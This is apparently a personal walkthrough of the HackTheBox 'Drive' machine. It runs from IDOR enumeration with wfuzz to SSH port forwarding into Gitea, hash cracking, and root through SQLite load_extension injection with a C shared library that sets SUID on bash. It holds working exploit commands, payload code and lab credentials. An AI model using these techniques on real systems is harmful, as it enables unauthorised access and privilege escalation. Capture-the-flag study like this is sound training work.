# Drive -htb(Compi)

namp :
	22, 80, 3000 filtered ppp ?

Have to create a acc on the site

user chao

my account pass : Chao@1999

After some googling and enum, i found a intersting url. drive.htb/<"id">/ block/

this endpoint is vuln to IDOR, so using wfuzz we can abuse this.

`wfuzz -u "http://drive.htb/FUZZ/block/" -z range,0-200 -H "Cookie: csrftoken=jJLDSCuSb4IqtLZOeeoZyXUdxQqcodOz; sessionid=y6beyol3xtu18c7vkjhjoutp8uq51igc" --hc 404`

tip: always enum/tinker with all the site's functionality . If you see ids , replace the id with any other number to see if u can read private info / information disclouser.

found user "martin" and his password "Xk4@KjyrYv8t194L!".

Interseitng IDs 99,98,79,101

---


## Martin SHELL ENUM:
	after using the creds ,we can login as martin.

Now i also found from the site's info leak that there was a backup folder in /var/www/backups

So i copied it to my local kali machine to further enumerate it.

`scp -r martin@10.10.11.235:/var/www/backups/ /home/kali/Desktop/HackTheBox/CompiHTB/Drive`

So there was nothing more in the shell for me , so i looked at the nmap scan again.

---
## Gitea ENUM:

Saw a filtered port 3000.

I did this type of asssemnt before so i tried to port forward it with ssh,

`ssh -L 8888:127.0.0.1:3000 martin@<ip>`

Now we visit the url `localhost:8888` in our browser and see GiTea(its a remote self hostin repo).

	Log in with the same martin creds as before.
	just add @drive.htb in the username after "martin"


There is a "crisDisel" repo, 
to access the repo, add your assinged forwarded port in order to access “crisDisel’s” repoitory.

There i found the zip password.
`H@ckThisP@ssW0rDIfY0uC@n:)`
I need dis pass to extract data from the backups.

----

CRACKING the password.sh File with hashCAT
--
hashcat -m 124 hash /usr/share/wordlists/rockyou.txt
gives dis res:
`sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a:johnmayer7`

This was for user `TomHands 
`tomHandstom@drive.htb`
pass: `johnmayer7`

After using this in ssh, change user - tom , i got the user flag.

Its time for the Escalation.

---

PRIV ESC
----------
There is a doodle cli there . Maybe the key to exploitation lies there.
But the cli is asking for creds, i dont have any,

Lets `strings` it to see if we find any creds.
`moriarty
findMeIfY0uC@nMr.Holmz!

found these. ALWAYS remember to use strings on files that ask u smth, or any files .


Also using the strings command i found a sqliite injection where the doodle-cli was asking for the username activation.

so i created a `exploit.py` file containing :
	`line = "./a"
	`print("\"+load_extension(char(" + ",".join(map(str, map(ord, line))) + "))+\"")`

and then created a shared librarry file , that shared librarry file will be needed to work with Run-Time Loadable Extensions .

Looking up in google tells us that :
`An SQLite extension is a shared library or DLL. To load it, you need to supply SQLite with the name of the file containing the shared library or DLL and an entry point to initialize the extension. In C code, this information is supplied using the [sqlite3_load_extension()](https://www.sqlite.org/c3ref/load_extension.html) API. See the documentation on that routine for additional information.`
So we need a  `.so` (shared library) file . We need a .c file and then complie it to a .so file.

There is also some sanitization and bypasses goin on in the app so the exploit file containing the payload is edited to fit .

Then you must create a file named a.c and in that put:

	#include <stdlib.h>
	#include <unistd.h>

	void _init() {
	    setuid(0);
	    setgid(0);
	    system("/usr/bin/chmod +s /bin/bash");
	}


Then you must turn this file into a shared object , namely a.so file

the command for that is :
	gcc -shared a.c -o a.so -fPIC

then run the app, select 5 and when it askes username just put the results of the exploit file.

After that restart the ssh connection and bash -p and u get root.

pwnd!

----
